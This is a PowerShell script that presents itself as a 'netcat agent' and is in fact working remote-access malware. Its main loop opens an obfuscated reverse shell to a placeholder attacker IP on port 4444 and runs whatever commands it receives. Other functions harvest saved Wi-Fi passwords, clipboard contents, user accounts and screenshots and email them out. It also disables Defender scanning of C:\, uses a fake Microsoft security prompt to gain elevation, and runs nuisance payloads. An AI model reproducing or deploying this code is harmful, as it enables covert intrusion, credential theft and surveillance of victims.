<#
===================================== Mon's Simple Netcat Agent With Added Functions ==================================================

SYNOPSIS
This Script opens a netcat agent on a target machine

for full functionality, use PS2EXE to write this as an executable file named "moncat.exe" (compile with the "-NoConsole" and "-NoError" parameter to hide any windows or prompts)

USAGE
1. Input all credentials needed (Line 152 and Line 349)
2. Open a terminal on the attacker machine and type "ncat -lvp 4444"
3. Run this script on the client machine
4. Once connected use "Options" command to show a list of fuctions.

#>

Function Options{
Start-Sleep 1
Write-Output "==================================================================================================================="
Write-Output "========================                    MONTOOLS MODULES                             =========================="
Write-Output "==================================================================================================================="
Write-Output "Commands list - "
Write-Output "================================================"
Write-Output "Sysinfo : get system information"
Write-Output "NetworkScan : get local network information"
Write-Output "FakeUpdate  : Start a Spoof update"
Write-Output "Win93  : Start windows93"
Write-Output "Sendinfo  : Email Sysinfo And Screenshot"
Write-Output "Exclude  : Exclude C:/ from future defender scans"
Write-Output "Elevate  : Elevate Privaleges (User will see a prompt)"
Write-Output "ProgramList : List of installed programs and EventLogs"
Write-Output "KillDisplay  : Kill Displays for a few seconds (Experimental)"
Write-Output "ShortcutBomb  : 100 Shortcuts on the desktop"
Write-Output "================================================"
Write-Output "Options     - Show this Menu"
Write-Output "Quit         - Close this connection"
Write-Output "================================================"
}

Function ProgramList {

$date = Get-Date -Format "yyyy-MM-dd-hh-mm-ss"
$outputPath = "$env:temp\Osint.txt"

New-Item -ItemType File -Path $outputPath

$installed = Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version, Vendor
$hotfixes = Get-WmiObject -Class Win32_QuickFixEngineering | Select-Object -Property HotFixID, Description, InstalledOn
$removed = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object -Property DisplayName, DisplayVersion, Publisher, InstallDate | Where-Object {$_.DisplayName -ne $null}

$installed | Format-Table -AutoSize | Out-File -FilePath $outputPath 
$hotfixes | Format-Table -AutoSize | Out-File -FilePath $outputPath -Append
$removed | Format-Table -AutoSize | Out-File -FilePath $outputPath -Append

$userActivity = Get-EventLog -LogName Security -EntryType SuccessAudit | Where-Object {$_.EventID -eq 4624 -or $_.EventID -eq 4634}
$userActivity | Out-File -FilePath $outputPath -Append
$hardwareInfo = Get-EventLog -LogName System | Where-Object {$_.EventID -eq 12 -or $_.EventID -eq 13}
$hardwareInfo | Out-File -FilePath $outputPath -Append

$textfile = Get-Content "$env:temp\Osint.txt" -Raw
Write-Output "$textfile"

}

Function KillDisplay {

(Add-Type '[DllImport("user32.dll")]public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)

}

Function ShortcutBomb {

$n = 100
$i = 0

while($i -lt $n) 
{
$num = Get-Random
$Location = "C:\Windows\System32\rundll32.exe"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware" + $num + ".lnk")
$Shortcut.TargetPath = $Location
$Shortcut.Arguments ="shell32.dll,Control_RunDLL hotplug.dll"
$Shortcut.IconLocation = "hotplug.dll,0"
$Shortcut.Description ="Device Removal"
$Shortcut.WorkingDirectory ="C:\Windows\System32"
$Shortcut.Save()
Start-Sleep -Milliseconds 10
$i++
}

}

Function NetworkScan {
Write-Output "Starting Network Scan.."

$TextBoxInput1 = "192.168.0."
$startip = "1"
$endip = "254"

$FileOut = "$env:temp\Computers.csv"
$Subnet = $TextBoxInput1
$a=[int]$startip
$b=[int]$endip

$a..$b|ForEach-Object{
    Start-Process -WindowStyle Hidden ping.exe -Argumentlist "-n 1 -l 0 -f -i 2 -w 1 -4 $SubNet$_"
}
$Computers = (arp.exe -a | Select-String "$SubNet.*dynam") -replace ' +',','|
  ConvertFrom-Csv -Header Computername,IPv4,MAC,x,Vendor|
                   Select IPv4,MAC
$Computers | Export-Csv $FileOut -NotypeInformation


$TextBoxInput2 = "192.168.1."
$startip = "1"
$endip = "254"

$FileOut = "$env:temp\Computers.csv"
$Subnet = $TextBoxInput2
$a=[int]$startip
$b=[int]$endip

$a..$b|ForEach-Object{
    Start-Process -WindowStyle Hidden ping.exe -Argumentlist "-n 1 -l 0 -f -i 2 -w 1 -4 $SubNet$_"
}
$Computers2 = (arp.exe -a | Select-String "$SubNet.*dynam") -replace ' +',','|
  ConvertFrom-Csv -Header Computername,IPv4,MAC,x,Vendor|
                   Select IPv4,MAC
$Computers2 | Export-Csv $FileOut -NotypeInformation -Append

$data = Import-Csv "$env:temp\Computers.csv"
$data | Add-Member -MemberType NoteProperty -Name "manufacturer" -Value ""
$data | ForEach-Object {

    $mac = $_.'MAC'
    $apiUrl = "https://api.macvendors.com/" + $mac
    $manufacturer = (Invoke-WebRequest -Uri $apiUrl).Content
    start-sleep 1
    $_ | Add-Member -MemberType NoteProperty -Name "manufacturer" -Value $manufacturer -force
}
$data | Export-Csv "$env:temp\Computers.csv" -NoTypeInformation
sleep 1

$data = Import-Csv "$env:temp\Computers.csv"
$data | Add-Member -MemberType NoteProperty -Name "Hostname" -Value ""
$data | ForEach-Object {
    try{
    $ip = $_.'IPv4'
    $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
    $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -force
    } catch{
    $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "Error: $($_.Exception.Message)"  
    }
}
$data | Export-Csv "$env:temp\Computers.csv" -NoTypeInformation


$textfile = Get-Content "$env:temp\Computers.csv" -Raw
Write-Output "$textfile"


}

Function FakeUpdate {
Write-Output "Starting Fake Update screen."
        $firstart = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"
        If (Test-Path $firstart) {
        New-Item $firstart
        }
        Set-ItemProperty $firstart HideFirstRunExperience -Value 1
        cmd.exe /c start chrome.exe --new-window -kiosk "https://fakeupdate.net/win8"
    function Do-SendKeys {
    param (
        $SENDKEYS,
        $WINDOWTITLE
    )
    $wshell = New-Object -ComObject wscript.shell;
    IF ($WINDOWTITLE) {$wshell.AppActivate($WINDOWTITLE)}
    Sleep 1
    IF ($SENDKEYS) {$wshell.SendKeys($SENDKEYS)}
}
    Do-SendKeys -WINDOWTITLE chrome.exe -SENDKEYS '{f11}'
    Write-Output "Done."
}

Function Win93 {
Write-Output "Starting Windows-93..."
         $firstart = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"
        If (Test-Path $firstart) {
        New-Item $firstart
        }
        Set-ItemProperty $firstart HideFirstRunExperience -Value 1
        cmd.exe /c start chrome.exe --new-window -kiosk "windows93.net"
           function Do-SendKeys {
    param (
        $SENDKEYS,
        $WINDOWTITLE
    )
    $wshell = New-Object -ComObject wscript.shell;
    IF ($WINDOWTITLE) {$wshell.AppActivate($WINDOWTITLE)}
    Sleep 1
    IF ($SENDKEYS) {$wshell.SendKeys($SENDKEYS)}
}
    Do-SendKeys -WINDOWTITLE chrome.exe -SENDKEYS '{f11}'
    Write-Output "Done."
}

Function Sendinfo {
Write-Output "Starting System info to Email.."
#============== INPUT YOUR EMAIL CREDENTIALS HERE ================
#EMAIL ADDRESS
$htffthft = "EMAIL_HERE"
#PASSWORD
$pijkhgh = "PASSWORD_HERE"
#==================================================================
$userString = "Username: $($userInfo.Name)"
$userString += "`nFull Name: $($userInfo.FullName)`n"

$userString+="Public Ip Address = "
$userString+=((Inv`o`ke-`W`ebR`e`qu`e`st ifconfig.me/ip).Content.Trim() | Out-String)
$userString+="`n"
$userString+="All User Accounts: `n"
$userString+= Get-WmiObject -Class Win32_UserAccount

$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
$biosInfo = Get-WmiObject -Class Win32_BIOS
$processorInfo = Get-WmiObject -Class Win32_Processor
$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$systemString = "Operating System: $($systemInfo.Caption) $($systemInfo.OSArchitecture)"
$systemString += "`nBIOS Version: $($biosInfo.SMBIOSBIOSVersion)"
$systemString += "`nProcessor: $($processorInfo.Name)"
$systemString += "`nMemory: $($systemInfo.TotalVisibleMemorySize) MB"
$systemString += "`nComputer Name: $($computerSystemInfo.Name)"

$installedPrograms = Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version
$programsString = "Installed Programs:`n"
foreach ($program in $installedPrograms) {
    $programsString += "  $($program.Name) $($program.Version)`n"
}

$a=0
$ws=(netsh wlan show profiles) -replace ".*:\s+"
foreach($s in $ws)
{if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){
$ssid=$s.Trim()
if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()
}
$pw=(netsh wlan show profiles name=$ssid key=clear)
$pass="None"
foreach($p in $pw){
if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim()
$wifistring+="SSID: $ssid`nPassword: $pass`n"}}}$a++;}


"------------------------   USER INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII
$userString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------   CLIPBOARD INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
Get-Clipboard | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------  SYSTEM INFO  --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
$systemString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------   WIFI INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
$wifistring | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------ PROGRAMS INFO --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
$programsString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
Write-Output "System and user information saved to text file."

$Filett = "$env:temp\SC.png"
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
Start-Sleep 2

Write-Output "Sending info..."
$vsdvvservd = "$env:temp\SC.png"
$adawdxcaec = "$env:temp\systeminfo.txt"
$vrdiugb = "$env:COMPUTERNAME : : Results"
$bfsvvrnbn = "$env:COMPUTERNAME : Info Scraper Results... : $tfhftttt"
$rtthtegtd = "smtp.outlook.com"
$rgdgthyu = "587"
$gtthyuyju = new-object Management.Automation.PSCredential $htffthft, ($pijkhgh | ConvertTo-SecureString -AsPlainText -Force)
$tfhftttt = Get-Date
$nytdrvd = $tfhftttt.addminutes($ughnfyd)
$sack = "$env:temp\SC.png"
If (Test-Path $sack) {
send-mailmessage -from $htffthft -to $htffthft -subject $vrdiugb -body $bfsvvrnbn -Attachment $adawdxcaec,$vsdvvservd -smtpServer $rtthtegtd -port $rgdgthyu -credential $gtthyuyju -usessl  
}
Else {
send-mailmessage -from $htffthft -to $htffthft -subject $vrdiugb -body $bfsvvrnbn -Attachment $adawdxcaec -smtpServer $rtthtegtd -port $rgdgthyu -credential $gtthyuyju -usessl
}

Write-Output "Done..."
}

Function Quit {
Write-Output "Closing..."
sleep 1
$v = 6
Get-Process moncat.exe | Stop-Process
exit
}

Function Exclude {
Write-Output "Excluding C:\ from defender scanning"
Add-MpPreference -ExclusionPath C:\ 
}

Function Elevate {
Add-Type -AssemblyName PresentationCore,PresentationFramework,System.Windows.Forms
Write-Output "User Prompt sent.."
$ErrorActionPreference = 'SilentlyContinue'
$Buttons = [System.Windows.MessageBoxButton]::OKCancel
$ErrorIcon = [System.Windows.MessageBoxImage]::Information
$Askme = 'Microsoft Security Center needs an update

Select "OK" to update now
        
Select "Cancel" to ignore'

If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    $Prompt = [System.Windows.MessageBox]::Show($Askme, "  Important Security Updates Needed", $Buttons, $ErrorIcon)
    Switch ($Prompt) {
        OK {
            Get-Process moncat.exe | Stop-Process
            sleep 1
            Start-Process moncat.exe -Verb RunAs
            Exit
        }
        Cancel {
            Break
        }}}}

Function Sysinfo {
Write-Output "Gathering System Information.."
$userString = "Username: $($userInfo.Name)"
$userString += "`nFull Name: $($userInfo.FullName)`n"

$userString+="Public Ip Address = "
$userString+=((Inv`o`ke-`W`ebR`e`qu`e`st ifconfig.me/ip).Content.Trim() | Out-String)
$userString+="`n"
$userString+="All User Accounts: `n"
$userString+= Get-WmiObject -Class Win32_UserAccount

$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
$biosInfo = Get-WmiObject -Class Win32_BIOS
$processorInfo = Get-WmiObject -Class Win32_Processor
$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$systemString = "Operating System: $($systemInfo.Caption) $($systemInfo.OSArchitecture)"
$systemString += "`nBIOS Version: $($biosInfo.SMBIOSBIOSVersion)"
$systemString += "`nProcessor: $($processorInfo.Name)"
$systemString += "`nMemory: $($systemInfo.TotalVisibleMemorySize) MB"
$systemString += "`nComputer Name: $($computerSystemInfo.Name)"

$installedPrograms = Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version
$programsString = "Installed Programs:`n"
foreach ($program in $installedPrograms) {
    $programsString += "  $($program.Name) $($program.Version)`n"
}

$a=0
$ws=(netsh wlan show profiles) -replace ".*:\s+"
foreach($s in $ws)
{if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){
$ssid=$s.Trim()
if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()
}
$pw=(netsh wlan show profiles name=$ssid key=clear)
$pass="None"
foreach($p in $pw){
if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim()
$wifistring+="SSID: $ssid`nPassword: $pass`n"}}}$a++;}


"------------------------   USER INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII
$userString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------   CLIPBOARD INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
Get-Clipboard | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------  SYSTEM INFO  --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
$systemString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------   WIFI INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
$wifistring | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
"------------------------ PROGRAMS INFO --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
$programsString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
Write-Output "System and user information saved to text file."

$textfile2 = Get-Content "$env:temp\systeminfo.txt" -Raw
Write-Output "$textfile2"
}

$v = 4
do{
#============== INPUT YOUR EMAIL CREDENTIALS HERE =========================
$a = New-Object S`ySt`em.N`eT.`s`ock`eTs.TC`PC`li`eNt("YOUR_IP_HERE",4444)
#==========================================================================
$b = $a.GetStream();[byte[]]$c = 0..65535|%{0}
while(($d = $b.Read($c, 0, $c.Length)) -ne 0){
$e = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($c,0, $d);$f = (iex $e 2>&1 | Out-String )
$g = $f + 'MShell | ' + (pwd).Path + '> '
$h = ([text.encoding]::ASCII).GetBytes($g)
$b.Write($h,0,$h.Length)
$b.Flush()}
$a.Close()
Sleep 10
}while ($v -le 5)
